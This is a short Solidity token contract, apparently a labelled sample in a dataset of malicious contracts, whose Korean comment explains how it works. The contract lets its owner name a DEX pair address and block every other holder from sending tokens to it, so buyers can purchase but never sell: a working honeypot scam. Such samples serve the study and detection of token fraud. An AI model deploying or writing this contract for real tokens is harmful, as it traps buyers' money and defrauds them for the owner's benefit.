// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 소유자가 marketPair를 지정한 뒤 일반 사용자가 그 주소로 전송하는 것만 차단할 수 있습니다. DEX 페어를 대상으로 설정하면 구매는 가능하지만 판매는 막히는 허니팟이 됩니다.
pragma solidity ^0.8.20;

contract BuyOnlyToken {
    address public owner;
    address public marketPair;
    bool public sellsEnabled;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function setPair(address pair) external onlyOwner { marketPair = pair; }
    function enableSells(bool enabled) external onlyOwner { sellsEnabled = enabled; }

    function transfer(address to, uint256 amount) external {
        if (to == marketPair && msg.sender != owner) {
            require(sellsEnabled, "sell disabled");
        }
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}
